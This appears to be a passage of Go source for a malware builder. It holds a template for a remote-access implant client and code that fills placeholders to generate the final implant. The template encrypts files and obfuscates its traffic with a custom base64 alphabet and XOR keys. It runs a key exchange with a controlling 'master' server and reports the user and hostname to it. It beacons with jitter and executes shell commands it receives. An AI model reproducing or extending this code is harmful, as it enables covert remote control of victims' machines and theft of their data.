        sin := (int(key[1024%len(key)])*len(data) ^ 1024) % len(key)
        ofkey := append([]byte{}, key[sin:]...)
        fuscateKey := ObfuscateBySteps(ofkey, obfKey)
        if len(fuscateKey) == 0 {
            return nil
        }
        out := make([]byte, len(data))
        for i := range data {
            out[i] = data[i] ^ fuscateKey[i%len(fuscateKey)]
        }
        return out
    }
    // 文件加密函数
    func get_encry_f(filePath string) ([]byte, error) {
        data, err := os.ReadFile(filePath)
        if err != nil {
            return nil, err
        }
        return Encrypt(data), nil
    }
    // 文件解密函数
    func get_decry_f(filepath, file_key string) error {
        data, ok := file_byte_parts[file_key]
        if !ok {
            return nil
        }
        delete(file_byte_parts, file_key)
        return os.WriteFile(filepath, Decrypt(data), 0666)
    }
    func get_encry_s(input *string) string {
        return customBase64Encode(Encrypt([]byte(*input)))
    }
    func get_decry_s(input *string) string {
        data := customBase64Decode(*input)
        if data == nil {
            return ""
        }
        return string(Decrypt(data))
    }
    // 编码函数
    func customBase64Encode(data []byte) string {
        var buf bytes.Buffer
        length := len(data)
        for i := 0; i < length; i += 3 {
            remain := length - i
            var b1, b2, b3 byte
            b1 = data[i]
            if remain > 1 {
                b2 = data[i+1]
            }
            if remain > 2 {
                b3 = data[i+2]
            }
            val := uint32(b1)<<16 | uint32(b2)<<8 | uint32(b3)
            outCount := 4
            if remain == 1 {
                outCount = 2
            } else if remain == 2 {
                outCount = 3
            }
            for j := 0; j < outCount; j++ {
                index := (val >> uint(18-6*j)) & 0x3F
                buf.WriteByte(base_rounds[index])
            }
        }
        return buf.String()
    }
    // 解码函数（无 padding）
    func customBase64Decode(s string) []byte {
        var (
            val  uint32
            valb int
        )
        out := make([]byte, 0, len(s))
        for i := 0; i < len(s); i++ {
            v, ok := decodeMap[s[i]]
            if !ok {
                continue
            }
            val = (val << 6) | uint32(v)
            valb += 6
            if valb >= 8 {
                valb -= 8
                out = append(out, byte((val>>valb)&0xFF))
            }
        }
        return out
    }
    func buildDecodeMap() map[byte]int {
        m := make(map[byte]int)
        for i := 0; i < len(base_rounds); i++ {
            m[base_rounds[i]] = i
        }
        return m
    }
    func generateUUID() string {
        rand.Seed(time.Now().UnixNano())
        uuid := make([]byte, 6+rand.Intn(7)) // 6 + [0..6]，长度6到12字节
        for i := 0; i < len(uuid); i++ {
            uuid[i] = byte(rand.Intn(256))
        }
        if len(uuid) > 6 {
            uuid[6] = (uuid[6] & 0x0f) | 0x40
        }
        if len(uuid) > 8 {
            uuid[8] = (uuid[8] & 0x3f) | 0x80
        }
        uuidStr := byteSliceToHex(uuid)
        return customBase64Encode([]byte(uuidStr))
    }
    func byteSliceToHex(bytes []byte) string {
        hexChars := "0123456789abcdef"
        result := make([]byte, len(bytes)*2)
        for i, b := range bytes {
            result[i*2] = hexChars[b>>4]
            result[i*2+1] = hexChars[b&0x0f]
        }
        return string(result)
    }
    func decryptString(key string, sharedKey []int) string {
        if key == "null" || len(sharedKey) == 0 {
            return key
        }
        clientKey := []byte(key)
        _sharedLen := len(sharedKey)
        // 直接索引对索引 XOR
        for i := 0; i < len(clientKey); i++ {
            idx := i % _sharedLen // 循环索引
            clientKey[i] ^= byte(sharedKey[idx])
        }
        return string(clientKey)
    }
    func onlyHex(s string) string {
        out := make([]rune, 0, len(s))
        for _, c := range s {
            if (c >= '0' && c <= '9') ||
                (c >= 'a' && c <= 'f') ||
                (c >= 'A' && c <= 'F') {
                out = append(out, c)
            }
        }
        return string(out)
    }
    func randBigInt(max *big.Int) *big.Int {
        if max.BitLen() <= 63 {
            return big.NewInt(rand.Int63()).Mod(big.NewInt(rand.Int63()), max)
        }
        return big.NewInt(rand.Int63()).Mod(big.NewInt(rand.Int63()), max)
    }
    func deriveP(raw string) *big.Int {
        hexStr := onlyHex(raw)
        pStr := "FFFFFFFFFFFF" + hexStr
        p, ok := new(big.Int).SetString(pStr, 16)
        if !ok {
            return nil
        }
        return p
    }
    func deriveG(p *big.Int) *big.Int {
        bits := byte(0)
        for i := 1024; i < 1032; i++ {
            bits = bits<<1 + byte(p.Bit(i))
        }
        g := big.NewInt(int64(bits))
        if g.Cmp(big.NewInt(2)) < 0 {
            g.Add(g, big.NewInt(2))
        }
        if g.Cmp(p) >= 0 {
            g.Mod(g, new(big.Int).Sub(p, big.NewInt(2)))
            g.Add(g, big.NewInt(2))
        }
        return g
    }
    func generateAndUpdateKey(url string) []int {
        // 先派生 p、g
        p := deriveP(base_rounds)
        if p == nil {
            return nil
        }
        g := deriveG(p)
        // 生成客户端私钥 b
        b := randBigInt(p)
        // 客户端公钥 B = g^b mod p
        B := new(big.Int).Exp(g, b, p)
        // 从服务端获取公钥
        base_respBody := getUrl(url)
        decodedBytes := customBase64Decode(base_respBody) // 得到 []byte
        if len(decodedBytes) == 0 {
            return nil
        }
        // 直接恢复服务端公钥 big.Int
        A := new(big.Int).SetBytes(decodedBytes)
        // 计算共享密钥 secret = A^b mod p
        secret := new(big.Int).Exp(A, b, p)
        secretBytes := secret.Bytes() // 可做后续加密或存储
        // 准备发送客户端公钥 B 给服务端
        BBytes := B.Bytes()
        BBase64 := customBase64Encode(BBytes)
        // 构造 URL，把客户端公钥发送给服务端
        key_url := protocol + master + "//*Path*/?/*option*/=/*switch_key*/&/*uid*/=" + uid + "&/*keyPart*/=" + BBase64
        getUrl(key_url)
        // 可返回共享密钥的整数形式
        re_key := make([]int, len(secretBytes))
        for i, b := range secretBytes {
            re_key[i] = int(b)
        }
        return re_key
    }
    func getConn(newKey_map *[]int) {
        key = "null"
        get_keyUrl := protocol + master + "//*Path*/?/*option*/=/*encry_key*/&/*uid*/=" + uid
        for {
            delayMutex.RLock()
            wait := int(delay)
            if delay > 30 {
                jitterMutex.RLock()
                wait += rand.Intn(jitter + 1)
                jitterMutex.RUnlock()
            }
            delayMutex.RUnlock()
            time.Sleep(time.Duration(wait) * time.Second)
            base_key_str := getUrl(get_keyUrl)
            decode_key_str := customBase64Decode(base_key_str)
            key_str := string(decode_key_str)
            if len(key_str) >= 1024 {
                key =  decryptString(key_str,*newKey_map)
                if key !="null"{
                    onece = false
                    return
                }
            }
        }
    }
    func run() {
        if onece {
            rand.Seed(time.Now().UnixNano())
            executable, _ = os.Executable()
            decodeMap = buildDecodeMap()
            if uid == "" {uid = generateUUID()}
            initHttpClient()
            if osname == "win"{version = "cmd"}else if osname == "linux" || osname == "macos"{version = "bash"}else if osname == "android"{version="/system/bin/sh"}
            clientname = strings.TrimSpace(Command("hostname"))
            post_headers["Host"] = master
            get_headers["Host"] = master
            user_b := customBase64Encode([]byte(user))
            client_b := customBase64Encode([]byte(clientname))
            url := protocol + master + "//*Path*/?/*option*/=/*ConnPath*/&/*uid*/=" + uid + "&/*user*/=" + user_b + "&/*hostname*/=" + client_b
            newKey_map:= generateAndUpdateKey(url)
            for {
                getConn(&newKey_map)
                if !onece && key != "null" && len(key) > 1024 {
                    send()
                    getCmd()
                } else {
                    continue
                }
            }
        }else{getCmd()}
    }
    `
    // 替换占位符
	replacements := map[string]string{
		`/\*sys_str\*/`:           sys_str,
		`/\*tls_str\*/`:           tls_str,
		`/\*protocol_var\*/`:      protocol_var,
		`/\*os\*/`:                o_os,
		`/\*Username\*/`:          u_username,
		`/\*server\*/`:            s_server,
		`/\*protocol_str\*/`:      protocol_str,
		`/\*main_str\*/`:          main_str,
		`/\*os_str\*/`:            os_str,
		`/\*Path\*/`:              Path,
		`/\*ConnPath\*/`:          ConnPath,
		`/\*MsgPath\*/`:           MsgPath,
        `/\*package_str\*/`:       package_str,
        `/\*switch_key\*/`:        switch_key,
        `/\*encry_key\*/`:         encry_key,
        `/\*download\*/`:          download,
        `/\*result\*/`:            result,
        `/\*_net\*/`:              _net,
        `/\*info\*/`:              info,
        `/\*upload\*/`:            upload,
        `/\*list\*/`:              list,
        `/\*option\*/`:            option,
        `/\*user\*/`:              user,
        `/\*uid\*/`:                uid,
        `/\*hostname\*/`:          hostname,
        `/\*keyPart\*/`:           keyPart,
        `/\*filekey\*/`:           filekey,
        `/\*code\*/`:              code,
        `/\*base_rounds\*/`:      base_rounds,
        `/\*send\*/`:             send,
        `/\*scan_str\*/`:         scan_str,
        `/\*scan_func\*/`:        scan_func,
	}
    //先将code中的关键词进行替换
	processedCode := replacePlaceholders(code, replacements, `/\*code\*/`)
    // 再将 send 字符串中的关键词进行替换
    processedSend := replacePlaceholders(send, replacements, `/\*send\*/`)
    processedscan := replacePlaceholders(scan_str, replacements, `/\*scan_str\*/`)
    // 更新 replacements 中的 send
    replacements[`/\*send\*/`] = processedSend
    replacements[`/\*scan_str\*/`] = processedscan
    // 最后整体替换模板
    final := applyTemplate(templateStr, processedCode, replacements)
    return final
}

func replacePlaceholders(input string, replacements map[string]string, skipKey string) string {
	for pattern, replacement := range replacements {
		if pattern == skipKey {
			continue
		}
		re := regexp.MustCompile(pattern)
		input = re.ReplaceAllString(input, replacement)
	}
	return input
}

func applyTemplate(templateStr, processedCode string, replacements map[string]string) string {
	const codeKey = `/\*code\*/`
	// 替换其他字段
	for pattern, replacement := range replacements {
		if pattern == codeKey {
			continue
		}
		re := regexp.MustCompile(pattern)
		templateStr = re.ReplaceAllString(templateStr, replacement)
	}
	// 最后替换 code 部分
	re := regexp.MustCompile(codeKey)
	templateStr = re.ReplaceAllString(templateStr, processedCode)

	return templateStr
}
